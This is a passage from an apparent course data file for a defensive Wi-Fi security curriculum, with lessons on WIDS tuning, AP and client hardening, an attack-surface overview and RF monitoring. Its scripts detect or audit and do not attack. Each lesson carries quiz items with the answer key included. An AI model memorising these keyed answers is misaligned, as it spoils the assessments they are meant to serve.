                    "It is always faster.",
                  ],
                  correct: 1,
                  explanation:
                    "Passive scanning only listens to existing traffic (beacons). It does not transmit any packets itself, making it undetectable to the networks it is monitoring. Active scanning sends probe requests, which can be logged by IDS systems and reveal the scanner's presence.",
                },
              ],
            },
          },
          {
            id: "lesson-12",
            title: "Wireless IDS Concepts & Alert Tuning",
            duration: "90 min",
            objectives: [
              "Differentiate between signature-based, anomaly-based, and state-based detection for wireless threats.",
              "Understand the critical importance of tuning alerting thresholds to reduce false positives and prevent alert fatigue.",
              "Identify key wireless-specific metrics and behaviors that a WIDS must monitor.",
              "Develop a practical strategy for triaging and responding to common WIDS alerts.",
            ],
            content: {
              overview:
                "A Wireless Intrusion Detection System (WIDS) acts as a continuous security camera for your organization's airspace. Unlike a traditional network IDS that inspects packets on a wire, a WIDS must understand the complexities of the 802.11 protocol to identify malicious activity. This lesson covers the core concepts of how a WIDS works, the types of events it looks for, and the crucial—often overlooked—process of tuning it to be an effective tool that generates actionable intelligence, not constant noise.",
              sections: [
                {
                  title: "WIDS Detection Methodologies",
                  content:
                    "<p>WIDS employ a multi-layered approach to detection:</p><ul><li><strong>Signature-Based Detection:</strong> The simplest method. It looks for known, predefined patterns or 'signatures' of attack. For example, a rule that says 'Alert if a deauthentication frame is sent from an external MAC address to the broadcast address (FF:FF:FF:FF:FF:FF)'. This is highly effective for well-known attacks like deauth floods or known-bad tool signatures but is blind to novel (zero-day) attacks.</li><li><strong>Anomaly-Based Detection:</strong> A more sophisticated method. It first establishes a statistical baseline of normal network behavior (e.g., average management frames per minute, normal client count) and then alerts on any significant deviation from that baseline. For example, 'Alert if the number of association requests per minute exceeds the normal average by 3 standard deviations'. This can detect new and unknown attacks but requires careful tuning to avoid false positives caused by legitimate traffic spikes.</li><li><strong>State-Based / Behavioral Detection:</strong> This method understands the 'state' of the 802.11 protocol. For example, it knows that a client must first authenticate and associate before it can send data. An alert would be triggered if a data frame is observed from a MAC address that never completed the association process. This is excellent for detecting specific protocol violations and impersonation attacks.</li></ul><p>A robust WIDS will use all three methods in concert.</p>",
                },
                {
                  title: "The Art and Science of Alert Tuning",
                  content:
                    "<p>An out-of-the-box WIDS is typically a source of overwhelming noise. If it generates thousands of low-fidelity alerts a day (false positives), security analysts will suffer from <strong>alert fatigue</strong> and begin to ignore them, potentially missing real threats. Tuning is the process of carefully adjusting the sensitivity and logic of detection rules to match your specific environment.</p><p><strong>The Tuning Process:</strong></p><ol><li><strong>Baseline:</strong> Run the WIDS in 'learning' or 'monitor' mode for a period of time to understand normal activity.</li><li><strong>Initial Deployment:</strong> Enable detection rules with conservative thresholds.</li><li><strong>Investigate & Refine:</strong> For every alert generated, investigate it thoroughly. If it's a false positive, adjust the rule to exclude the legitimate activity. This might involve whitelisting authorized MAC addresses, adjusting time thresholds, or adding more specific conditions to the rule logic.</li><li><strong>Document:</strong> Keep a log of why tuning decisions were made.</li><li><strong>Iterate:</strong> Tuning is never 'done'. It must be revisited whenever the network environment changes significantly.</li></ol>",
                },
                {
                  title: "Key WIDS Alert Scenarios",
                  content:
                    "<p>While tuning is specific to each environment, certain alerts should always be investigated and tuned for precision:</p><ul><li><strong>Deauthentication/Disassociation Floods:</strong> The classic DoS attack. Thresholds must be set to ignore occasional legitimate disconnects while catching floods.</li><li><strong>Known Rogue AP:</strong> An AP detected whose BSSID or SSID matches a known-bad signature from a threat intelligence feed.</li><li><strong>Unauthorized AP:</strong> An AP detected that is not in the authorized asset inventory.</li><li><strong>Ad-Hoc Network Detection:</strong> A peer-to-peer Wi-Fi connection between clients, which can bypass security controls.</li><li><strong>Wrong-Way Traffic:</strong> A client attempting to associate with an external AP while connected to the corporate network (potential data exfiltration).</li><li><strong>Beacon Frame Anomalies:</strong> Beacons spoofed to appear as an authorized SSID or beacons transmitted at an abnormally high rate (a tactic used in some attacks).</li></ul>",
                },
              ],
              codeExamples: [
                {
                  title:
                    "Simulating a WIDS Rule: Detecting Beacon Frame Spoofing",
                  language: "python",
                  code: '#!/usr/bin/env python3\n"""\nSimulated WIDS Rule: Beacon Spoofing Detection.\nThis script checks a PCAP for multiple BSSIDs advertising the same SSID,\nwhich is a potential indicator of an Evil Twin attack.\nThis is a simplified example for educational purposes.\n"""\nfrom scapy.all import rdpcap, Dot11, Dot11Elt\n\ndef detect_beacon_spoofing(pcap_file):\n    """\n    A simple signature-based rule to detect potential Evil Twin APs.\n    Alerts if the same SSID is seen from multiple BSSIDs.\n    """\n    ssid_to_bssid = {}\n    \n    try:\n        packets = rdpcap(pcap_file)\n    except FileNotFoundError:\n        print(f"Error: File \'{pcap_file}\' not found.")\n        return\n\n    # Build a dictionary mapping SSIDs to a set of BSSIDs\n    for pkt in packets:\n        if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8: # Beacon\n            bssid = pkt.addr2\n            ssid_elt = pkt.getlayer(Dot11Elt)\n            # Walk through the packet to find the SSID element\n            while ssid_elt and ssid_elt.ID != 0:\n                ssid_elt = ssid_elt.payload.getlayer(Dot11Elt)\n            if ssid_elt and ssid_elt.ID == 0:\n                try:\n                    ssid = ssid_elt.info.decode(\'utf-8\', errors=\'ignore\')\n                    if ssid: # Ignore empty/hidden SSIDs for this demo\n                        if ssid not in ssid_to_bssid:\n                            ssid_to_bssid[ssid] = set()\n                        ssid_to_bssid[ssid].add(bssid)\n                except UnicodeDecodeError:\n                    pass\n\n    # Check for SSIDs advertised by multiple BSSIDs\n    print("[+] Beacon Spoofing Analysis:")\n    alert_triggered = False\n    for ssid, bssid_set in ssid_to_bssid.items():\n        if len(bssid_set) > 1:\n            print(f"   [ALERT] Potential Evil Twin: SSID \'{ssid}\' is advertised by {len(bssid_set)} different BSSIDs: {bssid_set}")\n            alert_triggered = True\n    \n    if not alert_triggered:\n        print("   [INFO] No obvious beacon spoofing detected.")\n\n# Example usage\ndetect_beacon_spoofing(\'capture.pcap\')',
                },
                {
                  title:
                    "Configuring a Threshold-Based Alert in a WIDS (Pseudocode)",
                  language: "plaintext",
                  code: '# This is not real code but represents the logic of a configurable WIDS rule.\n# A real WIDS would have a GUI or config file for this.\n\nRULE ID: 105\nNAME: "Potential Deauthentication Flood"\nTYPE: Anomaly-Based (Threshold)\nDESCRIPTION: "Alert if deauth frames exceed normal baseline within a time window."\n\nPARAMETERS:\n  METRIC: Count of Deauthentication Frames\n  TIME_WINDOW: 60 seconds  # Check every minute\n  THRESHOLD: 25 frames     # Alert if more than 25 deauths in a minute\n  # Tuning: This threshold might be 5 in a quiet office, but 50 in a busy warehouse.\n  DIRECTION: Any Source -> Any Destination\n  EXCLUDE: BSSID = AA:BB:CC:DD:EE:FF # Whitelist a known test tool\n\nSEVERITY: High\nRESPONSE: Send email to SOC, create ticket, trigger SNMP trap to NOC.\n\n# This rule would be tuned over time. If legitimate reconfiguration tools\n# cause false positives, their MACs would be added to the EXCLUDE list.',
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "A WIDS has a rule to 'alert if the number of association request frames in a minute is more than 3 standard deviations above the 30-day rolling average'. What type of detection is this?",
                  options: [
                    "Signature-based",
                    "Anomaly-based",
                    "State-based",
                    "Heuristic-based",
                  ],
                  correct: 1,
                  explanation:
                    "This is a classic example of anomaly-based detection. It relies on statistical analysis of historical data to establish a baseline of 'normal' behavior and then flags significant deviations from that pattern.",
                },
                {
                  id: 2,
                  question:
                    "What is the primary goal of 'alert tuning' in a WIDS?",
                  options: [
                    "To make the WIDS monitor more channels simultaneously.",
                    "To reduce false positives so that the alerts are meaningful and actionable, preventing analyst fatigue.",
                    "To increase the detection range of the sensors.",
                    "To disable all signature-based rules.",
                  ],
                  correct: 1,
                  explanation:
                    "The ultimate goal of tuning is to increase the <strong>signal-to-noise ratio</strong>. By minimizing false positives, security analysts can focus their limited time and energy on investigating alerts that have a higher probability of being real threats.",
                },
                {
                  id: 3,
                  question:
                    "Why is state-based detection particularly useful in a WIDS?",
                  options: [
                    "It requires less processing power than other methods.",
                    "It can understand the logical sequence of 802.11 protocol frames and detect violations, like a client sending data before it has associated.",
                    "It is the easiest type of detection to implement.",
                    "It doesn't require any initial baselining period.",
                  ],
                  correct: 1,
                  explanation:
                    "State-based detection models the expected flow of the wireless protocol. This allows it to catch sophisticated attacks that don't have a known signature but instead break the rules of how 802.11 is supposed to work, such as sequence number flaws or invalid state transitions.",
                },
              ],
            },
          },
          {
            id: "lesson-13",
            title: "Secure AP Configuration (Hardening)",
            duration: "90 min",
            objectives: [
              "Create and apply a secure configuration baseline for enterprise wireless access points.",
              "Understand the security risks of legacy features and protocols (WPS, WEP, WPA/TKIP) and how to disable them.",
              "Implement network segmentation and access control using VLANs, SSIDs, and firewall policies.",
              "Enforce modern security protocols (WPA3, 802.11w PMF) and manage the migration from legacy systems.",
            ],
            content: {
              overview:
                "The security of a wireless network is only as strong as the weakest configuration on its access points. A single misconfigured AP can serve as a gateway for attackers to bypass perimeter defenses. This lesson provides a practical, defense-oriented checklist of hardening steps that must be applied to any enterprise-grade AP to establish a strong security posture. We will move beyond simple checklist items and explore the 'why' behind each recommendation, enabling you to make informed decisions for your specific environment.",
              sections: [
                {
                  title: "The Defense-in-Depth Hardening Checklist",
                  content:
                    "<p>AP hardening is a process of applying defense-in-depth principles specifically to wireless infrastructure.</p><ul><li><strong>1. Change Default Credentials:</strong> The absolute first step. This includes not only the web GUI but also SSH, SNMP, and other management interface passwords. Use unique, complex passwords or, better yet, certificate-based authentication.</li><li><strong>2. Disable WPS (Wi-Fi Protected Setup):</strong> WPS has critical design flaws (e.g., PIN brute-forcing) that cannot be fully mitigated. It must be permanently disabled on all APs in a secure environment. There is no exception.</li><li><strong>3. Disable Legacy Protocols:</strong> Explicitly disable support for WEP, WPA (TKIP), and 802.11b. These protocols are cryptographically broken and their presence on the network only increases the attack surface. Force clients to use modern standards.</li><li><strong>4. Enforce the Strongest Security Protocol:</strong> Configure the AP to use <strong>WPA3-Enterprise</strong> (with 802.1X) wherever possible. For personal/PSK use cases, use <strong>WPA3-Personal (SAE)</strong>. If legacy client support is an unavoidable business requirement, create a separate SSID mapped to a tightly controlled VLAN using <strong>WPA2-Enterprise</strong> with a plan to migrate away from it. Avoid 'transition mode' (supporting both WPA2 and WPA3 on the same SSID) in secure environments due to the potential for downgrade attacks.</li><li><strong>5. Require Protected Management Frames (PMF):</strong> Set PMF (802.11w) to '<strong>Required</strong>', not just 'Capable'. This non-negotiable setting mitigates deauthentication and disassociation attacks. WPA3 makes this mandatory.</li><li><strong>6. Enable Client Isolation:</strong> Also known as 'AP Isolation' or 'Wireless Client Isolation'. This feature prevents wireless clients on the same SSID/VLAN from communicating directly with each other. This is crucial on guest networks to limit the lateral movement of malware between untrusted devices.</li><li><strong>7. Implement Robust Network Segmentation with VLANs:</strong> Do not put all wireless traffic on one VLAN. Use separate SSIDs that trunk to different VLANs: e.g., <code>Corp-Secure</code> (VLAN 10, access to internal resources), <code>Corp-Guest</code> (VLAN 20, internet-only with strict filtering), <code>IoT</code> (VLAN 30, isolated segment with no internet access). Apply firewall rules between these VLANs.</li><li><strong>8. Secure the Management Interface:</strong> Disable HTTP management and enforce HTTPS. Restrict management access to specific, trusted source IP addresses on your management network. Disable SNMP if not needed, or use SNMPv3 with strong authentication.</li><li><strong>9. Adjust Transmit Power:</strong> Reduce the AP's transmit power to the minimum level required for adequate coverage. This practice 'right-sizes' your wireless cell, reducing the signal bleed outside your physical security perimeter and making it harder for attackers to interact with your network from parking lots or other public areas.</li><li><strong>10. Establish a Firmware Update Policy:</strong> Regularly check for and apply security patches and firmware updates from the vendor. Subscribe to security advisories for your AP vendor. This is one of the most effective defenses against newly discovered vulnerabilities.</li></ul>",
                },
                {
                  title: "Beyond the Checklist: Architecture and Monitoring",
                  content:
                    "<p>Hardening doesn't end with AP configuration. The surrounding architecture is equally important:</p><ul><li><strong>Wireless Controller Security:</strong> If using a controller-based architecture (e.g., Cisco, Aruba), the controller itself becomes a high-value target and must be hardened accordingly.</li><li><strong>RADIUS Server Security:</strong> The authentication server is the brain of an enterprise WLAN. Its compromise means total network compromise. Harden it fiercely.</li><li><strong>Centralized Management & Monitoring:</strong> Use a Wireless Network Management System (WNMS) or similar tool to push consistent configurations, monitor AP health, and detect anomalies across your entire fleet of APs. This ensures your hardening baseline is maintained at scale.</li></ul>",
                },
              ],
              codeExamples: [
                {
                  title: "Example: Hardened ZoneFlex AP Configuration Snippet",
                  language: "plaintext",
                  code: '# This is a conceptual snippet from a Ruckus ZoneDirector configuration.\n# It shows key hardening settings applied via a central management system.\n# Specific syntax will vary by vendor.\n\n# Define a hardened WLAN (SSID) profile\nwlan profile "Corp-Secure"\n    ssid "Corp-Secure"\n    hide-ssid disabled         # Hiding SSID is not security\n    max-clients 50             # Limit clients per AP to prevent overload\n    vlan 10                   # Segment to Corp VLAN\n    \n    # --- Security Settings ---\n    auth-type wpa3-enterprise # Enforce WPA3\n    pmf required              # Require Protected Management Frames\n    \n    # --- Explicitly Disable Legacy & Weak Settings ---\n    wpa-auth disabled\n    wpa2-auth disabled        # Force WPA3 only\n    wep disabled\n    wps disabled\n    \n    # --- Advanced Hardening ---\n    client-isolation enabled  # Isolate wireless clients from each other\n    rate-set 12-54           # Disable low, legacy data rates (1, 2, 5.5, 6, 9, 11 Mbps)\n    tx-power 50              # Reduce transmit power to 50%\n    \n# Apply this profile to specific AP groups or locations\napply wlan "Corp-Secure" to group "HeadOffice-APs"',
                },
                {
                  title: "Bash Script to Audit AP Configurations via SSH",
                  language: "bash",
                  code: '#!/bin/bash\n# AP Configuration Audit Script\n# Connects to a list of APs via SSH and checks for critical hardening misconfigurations.\n# Requires SSH keys to be set up for password-less login.\n# This is a conceptual example. Commands will vary wildly by AP vendor and model.\n\nAP_LIST=("ap1.example.com" "ap2.example.com" "ap3.example.com")\nAUDIT_LOG="ap_audit_$(date +%Y%m%d).log"\n\necho "Starting AP Configuration Audit" > $AUDIT_LOG\n\nfor ap in "${AP_LIST[@]}"; do\n    echo "\\n--- Auditing $ap ---" | tee -a $AUDIT_LOG\n    \n    # Check if WPS is enabled (look for a positive status)\n    ssh admin@$ap "show wps status" | grep -i enabled >> $AUDIT_LOG 2>&1 && echo "WPS ENABLED ON $ap - FINDING!" | tee -a $AUDIT_LOG\n    \n    # Check for WPA/TKIP being enabled\n    ssh admin@$ap "show wlan summary" | grep -i TKIP >> $AUDIT_LOG 2>&1 && echo "TKIP ENABLED ON $ap - FINDING!" | tee -a $AUDIT_LOG\n    \n    # Check firmware version against a known good version\n    CURRENT_FW=$(ssh admin@$ap "show version" | grep "Firmware Version")\n    echo "Firmware: $CURRENT_FW" >> $AUDIT_LOG\n    # ...add logic here to compare against a list of latest versions...\n    \n    echo "--- Audit for $ap complete ---" >> $AUDIT_LOG\n\ndone\n\necho "Audit complete. Review the log: $AUDIT_LOG"',
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the security risk of leaving Wi-Fi Protected Setup (WPS) enabled on an access point?",
                  options: [
                    "It can slightly reduce the maximum connection speed for clients.",
                    "It has known vulnerabilities that can allow an attacker to recover the network's password through a brute-force attack on its PIN.",
                    "It is not compatible with modern operating systems like Windows 11.",
                    "It requires a special license from the Wi-Fi Alliance.",
                  ],
                  correct: 1,
                  explanation:
                    "The WPS PIN authentication method is fundamentally flawed and can typically be brute-forced in a matter of hours, giving an attacker the network's pre-shared key regardless of its complexity. This is why it must be disabled without exception.",
                },
                {
                  id: 2,
                  question:
                    "What is the purpose of 'Client Isolation' on an access point?",
                  options: [
                    "To block all clients from accessing the internet.",
                    "To prevent wireless clients on the same SSID/VLAN from communicating directly with each other, limiting lateral movement for attackers and malware.",
                    "To force all clients to use a VPN for their connection.",
                    "To assign each client a unique encryption key.",
                  ],
                  correct: 1,
                  explanation:
                    "Client isolation is a critical containment control, especially on untrusted networks like guest Wi-Fi. If one device is compromised, isolation prevents it from easily scanning and attacking other devices on the same wireless network.",
                },
                {
                  id: 3,
                  question:
                    "Why is it a recommended practice to reduce the transmit power of an AP?",
                  options: [
                    "To save on electricity costs.",
                    "To 'right-size' the wireless cell, reducing signal bleed outside the physical security perimeter and making it harder for attackers to reach the network from afar.",
                    "To force clients to use faster data rates.",
                    "To comply with FCC regulations.",
                  ],
                  correct: 1,
                  explanation:
                    "While saving power is a minor benefit, the primary security goal is to contain the RF signal within the controlled environment. A strong signal extending into a public area is an invitation for wardriving and external attacks. The goal is adequate indoor coverage, not maximum range.",
                },
              ],
            },
          },
          {
            id: "lesson-14",
            title: "Client Hardening & Secure Onboarding",
            duration: "75 min",
            objectives: [
              "Understand the risks of misconfigured wireless clients (supplicants) and how they can undermine network security.",
              "Implement and deploy secure 802.1X profiles that enforce certificate validation and strong EAP methods.",
              "Practice good hygiene for managing the Preferred Network List (PNL) to prevent auto-connecting to rogue networks.",
              "Develop user education materials to combat the threat of untrusted and adversarial Wi-Fi networks.",
            ],
            content: {
              overview:
                "Securing the infrastructure (APs, controllers, RADIUS) is only half of the wireless security equation. The client devices that connect to the network must also be configured securely. A misconfigured client can leak credentials, automatically connect to malicious networks, and bypass all the careful infrastructure security you have put in place. This lesson covers the best practices for hardening wireless clients, focusing on automated, secure onboarding processes and user education to create a human firewall.",
              sections: [
                {
                  title:
                    "Hardening the Supplicant: The First Line of Client Defense",
                  content:
                    "<p>The 'supplicant' is the software on the client device (Windows, macOS, iOS, Android, Linux) that handles the 802.1X/EAP authentication. Its configuration is paramount.</p><p><strong>Critical Hardening Steps:</strong></p><ul><li><strong>1. Enforce Server Certificate Validation:</strong> This is the most important client-side setting. The client <strong>must</strong> be configured to validate the RADIUS server's certificate. This involves: <strong>a)</strong> Checking that the certificate is signed by a trusted, specific Certificate Authority (CA) that you control. <strong>b)</strong> Validating that the server's certificate Subject Alternative Name (SAN) or Common Name (CN) matches the expected domain (e.g., <code>radius.corp.com</code>). <strong>Without this validation, the client is vulnerable to Evil Twin attacks</strong> where an attacker presents any certificate and the client blindly accepts it.</li><li><strong>2. Prefer EAP-TLS:</strong> Whenever possible, deploy client-side certificates and use EAP-TLS. This provides mutual authentication (client authenticates server, server authenticates client) and eliminates the risk of password phishing and brute-forcing. The client certificate itself becomes the credential.</li><li><strong>3. Automate Secure Onboarding:</strong> Never rely on users to manually configure complex 802.1X settings. Use mobile device management (MDM) solutions, Group Policy Objects (GPO), or provisioning tools to automatically and consistently deploy the correct, hardened wireless profiles to all corporate devices. This ensures uniformity and eliminates human error.</li></ul>",
                },
                {
                  title:
                    "Preferred Network List (PNL) Hygiene and User Behavior",
                  content:
                    "<p>Operating systems maintain a list of known Wi-Fi networks to automatically reconnect to. This convenience feature is a major security risk.</p><ul><li><strong>The Risk:</strong> If this list contains common SSIDs like 'xfinitywifi', 'attwifi', 'linksys', or even a previously connected 'CoffeeShop', the device may automatically associate with a malicious hotspot broadcasting that same SSID. This can happen without any user interaction as the user walks through a city.</li><li><strong>The Solution - PNL Hygiene:</strong> Configure devices via MDM/GPO to only auto-connect to corporate SSIDs. Educate users to regularly 'forget' or remove networks they no longer use. For Windows, the '<code>netsh wlan delete profile name=\"SSID\"</code>' command can manage this. Avoid connecting to open, public Wi-Fi networks that require a click-through portal; use a cellular hotspot or VPN instead.</li><li><strong>User Education:</strong> Train users to recognize the signs of an insecure network and to be wary of connecting to any network that is not officially provided. They should understand that just because a network has a familiar name does not mean it is safe. Encourage them to report any suspicious connection prompts or certificate warnings to the IT department immediately.</li></ul>",
                },
              ],
              codeExamples: [
                {
                  title:
                    "Windows: Deploying a Hardened WPA3-Enterprise Profile via PowerShell",
                  language: "powershell",
                  code: '# This PowerShell script creates a hardened WPA3-Enterprise profile using EAP-TLS.\n# It should be deployed via Group Policy or an MDM system, not run manually by users.\n# It demonstrates the critical \'Server Validation\' settings.\n\n$ProfileName = "Corp-Secure-WPA3"\n$SSID = "Corp-Secure"\n\n# Delete the profile if it exists to ensure a clean configuration\nnetsh wlan delete profile name="$ProfileName"\n\n# Create the XML configuration for the profile\n# Note: The \'trustedRootCA\' thumbprint MUST match your enterprise CA\'s thumbprint.\n$ProfileXml = @"\n<?xml version="1.0"?>\n<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">\n    <name>$ProfileName</name>\n    <SSIDConfig>\n        <SSID>\n            <name>$SSID</name>\n        </SSID>\n    </SSIDConfig>\n    <connectionType>ESS</connectionType>\n    <connectionMode>auto</connectionMode>\n    <MSM>\n        <security>\n            <authEncryption>\n                <authentication>WPA3</authentication>\n                <encryption>AES</encryption>\n                <useOneX>true</useOneX>\n            </authEncryption>\n            <OneX xmlns="http://www.microsoft.com/networking/OneX/v1">\n                <authMode>machine</authMode>\n                <EAPConfig>\n                    <EapHostConfig xmlns="http://www.microsoft.com/provisioning/EapHostConfig">\n                        <EapMethod>\n                            <Type>13</Type> <!-- EAP-TLS -->\n                            <VendorId>0</VendorId>\n                            <VendorType>0</VendorType>\n                            <AuthorId>0</AuthorId>\n                        </EapMethod>\n                        <Config xmlns="http://www.microsoft.com/provisioning/EapHostConfig">\n                            <Eap xmlns="http://www.microsoft.com/provisioning/BaseEapConnectionPropertiesV1">\n                                <Type>13</Type>\n                                <EapType xmlns="http://www.microsoft.com/provisioning/EapTlsConnectionPropertiesV1">\n                                    <CredentialsSource>\n                                        <CertificateStore>\n                                            <SimpleCertSelection>true</SimpleCertSelection>\n                                        </CertificateStore>\n                                    </CredentialsSource>\n                                    <!-- CRITICAL SERVER VALIDATION -->\n                                    <ServerValidation>\n                                        <DisableUserPromptForServerValidation>true</DisableUserPromptForServerValidation>\n                                        <ServerNames>radius.corp.com</ServerNames> <!-- Expected SAN/CN -->\n                                        <TrustedRootCA> a1 b2 c3 d4 e5 f6 00 01 02 03 04 05 06 07 08 09 </TrustedRootCA> <!-- Your CA\'s Thumbprint -->\n                                    </ServerValidation>\n                                    <DifferentUsername>false</DifferentUsername>\n                                </EapType>\n                            </Eap>\n                        </Config>\n                    </EapHostConfig>\n                </EAPConfig>\n            </OneX>\n        </security>\n    </MSM>\n</WLANProfile>\n"@\n\n# Write the XML to a temporary file and import it\n$TempFile = [System.IO.Path]::GetTempFileName()\n$ProfileXml | Out-File -FilePath $TempFile -Encoding ASCII\nnetsh wlan add profile filename="$TempFile" user=all\nRemove-Item $TempFile\n\nWrite-Host "Hardened profile \'$ProfileName\' for SSID \'$SSID\' has been imported."',
                },
                {
                  title: "macOS: Script to Audit Client Wi-Fi Settings",
                  language: "bash",
                  code: '#!/bin/bash\n# macOS Client Wi-Fi Security Audit Script\n# Checks for common misconfigurations on a macOS client.\n\necho "=== macOS Wi-Fi Security Audit ==="\n\n# 1. Check list of known networks (PNL)\necho "\\n--- Preferred Network List (PNL) ---"\ndefaults read /Library/Preferences/SystemConfiguration/com.apple.airport.preferences RememberedNetworks | grep -o "SSIDString = \\".*\\";" | sed \'s/SSIDString = "\\(.*\\)";/\\1/\' | sort\n# Look for common, risky SSIDs like "attwifi", "xfinitywifi", etc.\n\n# 2. Check for specific corporate profile settings (example for a PEAP network)\necho "\\n--- Checking Corporate Profile Settings ---"\n# This command lists all network profiles. Look for your corporate SSID.\n/usr/sbin/networksetup -listallnetworkservices\n\nCORP_SSID="Corp-Secure"\necho "\\n--- Details for $CORP_SSID ---"\n/usr/sbin/networksetup -getinfo "$CORP_SSID"\n\n# 3. Check if the user is currently connected to an untrusted network\nCURRENT_SSID=$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | awk -F: \'/ SSID/ {print $2}\' | xargs)\n# A simple check: if not connected to corp, warn.\nif [ "$CURRENT_SSID" != "$CORP_SSID" ]; then\n    echo "\\n[WARNING] Currently connected to \'$CURRENT_SSID\', not corporate network."\nfi\n\necho "\\n=== Audit Complete ==="',
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "In an EAP-TLS network, why is it critical for the client to be configured to validate the RADIUS server's certificate?",
                  options: [
                    "To make the connection faster.",
                    "To prevent the client from connecting to a malicious RADIUS server set up by an attacker as part of an Evil Twin attack.",
                    "This step is only necessary for WPA2, not WPA3.",
                    "To ensure the client gets the correct IP address.",
                  ],
                  correct: 1,
                  explanation:
                    "Server certificate validation is the client's mechanism for ensuring it is talking to the <em>legitimate</em> authentication server. Without this check, an attacker can trivially set up a rogue AP with a fake RADIUS server and intercept all authentication attempts, potentially stealing credentials or gaining network access.",
                },
                {
                  id: 2,
                  question:
                    "What is a significant security risk of having common SSIDs (e.g., 'attwifi') in your device's Preferred Network List (PNL)?",
                  options: [
                    "It will drain the device's battery faster.",
                    "Your device may automatically connect to an attacker's malicious AP that is spoofing that common SSID, exposing your traffic.",
                    "It will prevent you from connecting to your home network.",
                    "It is not a risk; this is normal behavior.",
                  ],
                  correct: 1,
                  explanation:
                    "The PNL's automatic connection feature is a major convenience vulnerability. An attacker can easily broadcast a common SSID, and your device, seeking a known network, will connect without prompting you. This gives the attacker a position to perform man-in-the-middle attacks on your traffic.",
                },
                {
                  id: 3,
                  question:
                    "What is the most effective way to ensure all corporate devices have a uniformly secure Wi-Fi configuration?",
                  options: [
                    "Emailing instructions to all employees and hoping they follow them correctly.",
                    "Using Mobile Device Management (MDM) or Group Policy (GPO) to automatically push and enforce pre-configured, hardened wireless profiles.",
                    "Having the IT department manually configure each device as users are onboarded.",
                    "Printing out the configuration steps and posting them on a bulletin board.",
                  ],
                  correct: 1,
                  explanation:
                    "Manual configuration is error-prone and impossible to manage at scale. Automated deployment via MDM/GPO is the only reliable method to ensure every device has the correct, hardened configuration (especially the critical server validation settings) applied consistently and can be updated centrally if needed.",
                },
              ],
            },
          },
          {
            id: "lesson-15",
            title: "Wireless Attack Surface Review (High-Level)",
            duration: "60 min",
            objectives: [
              "Categorize the major types of wireless attacks.",
              "Map defensive controls to each attack category.",
              "Review common attack vectors without focusing on exploit execution.",
              "Understand the attacker's mindset from a defender's perspective.",
            ],
            content: {
              overview:
                "This lesson synthesizes our previous discussions into a high-level overview of the wireless attack surface. We will categorize common attacks and map them to the defensive strategies and hardening techniques learned so far. The goal is to build a holistic, defense-in-depth mindset, not to learn how to execute attacks.",
              sections: [
                {
                  title: "Attack Categories and Mitigations",
                  content:
                    "<ul><li><strong>Eavesdropping:</strong> Attackers listen to wireless traffic.<ul><li><strong>Mitigation:</strong> Strong encryption (WPA2/WPA3). Never use Open or WEP networks.</li></ul></li><li><strong>Impersonation & Man-in-the-Middle (MITM):</strong> Evil Twin APs, fake captive portals.<ul><li><strong>Mitigation:</strong> 802.1X with server certificate validation (EAP-TLS), user education about certificate warnings.</li></ul></li><li><strong>Denial of Service (DoS):</strong> Deauthentication floods, RF jamming.<ul><li><strong>Mitigation:</strong> Protected Management Frames (PMF), WIDS to detect floods, physical security.</li></ul></li><li><strong>Configuration Weaknesses:</strong> Weak PSK passwords, WPS enabled, transition mode vulnerabilities.<ul><li><strong>Mitigation:</strong> Regular auditing, AP hardening checklists, user password policies.</li></ul></li></ul>",
                },
              ],
              codeExamples: [],
              activities: [
                {
                  title: "Map Mitigations to Threats",
                  description:
                    "Create a table with two columns. In the first column, list the major attack categories (e.g., Eavesdropping, DoS). In the second column, list all the specific defensive controls and configurations that help mitigate that threat.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the most effective defense against passive eavesdropping on a Wi-Fi network?",
                  options: [
                    "Hiding the SSID.",
                    "Using a strong, modern encryption protocol like WPA3.",
                    "MAC address filtering.",
                    "Using a firewall.",
                  ],
                  correct: 1,
                  explanation:
                    "Encryption is the only control that ensures the confidentiality of data in transit over the airwaves.",
                },
                {
                  id: 2,
                  question:
                    "A defense-in-depth strategy for Wi-Fi security means:",
                  options: [
                    "Only using one very strong security control.",
                    "Relying on multiple, layered security controls (e.g., strong encryption + client isolation + WIDS).",
                    "Focusing only on physical security.",
                    "Assuming users will never make mistakes.",
                  ],
                  correct: 1,
                  explanation:
                    "Defense-in-depth is the principle that multiple layers of security are more effective than a single one, as the failure of one control does not mean a total compromise.",
                },
              ],
            },
          },
          {
            id: "lesson-16",
            title: "Monitoring Channel Utilization & Noisy Neighbors",
            duration: "75 min",
            objectives: [
              "Understand the concepts of co-channel interference and congestion.",
              "Recognize how RF interference can be a form of denial of service.",
              "Use passive analysis to visualize channel occupancy in a given area.",
              "Learn the basics of channel planning for optimal performance and security.",
            ],
            content: {
              overview:
                "While not always malicious, radio frequency (RF) interference can severely degrade or disable a wireless network, effectively causing a denial of service. This lesson covers the defensive practice of monitoring the RF environment to identify sources of interference, ensure proper channel planning, and detect potential RF jamming.",
              sections: [
                {
                  title: "Co-Channel Interference and Congestion",
                  content:
                    "<p>When multiple APs in close proximity operate on the same channel, they must take turns transmitting, which slows down the network for everyone. This is co-channel interference. A defender needs to plan channel usage carefully (e.g., using only channels 1, 6, and 11 in the 2.4 GHz band) to minimize this overlap.</p>",
                },
                {
                  title: "Detecting RF Jamming",
                  content:
                    "<p>RF jamming is the intentional blasting of radio noise to disrupt communication. While specialized hardware is needed to perfectly analyze the RF spectrum, a WIDS can infer jamming by observing a sudden, dramatic increase in noise floor, a drop in signal-to-noise ratio (SNR), or a high rate of corrupted frames and retransmissions across all clients.</p>",
                },
              ],
              codeExamples: [
                {
                  title: "Generate a Channel Usage Histogram from a PCAP",
                  language: "python",
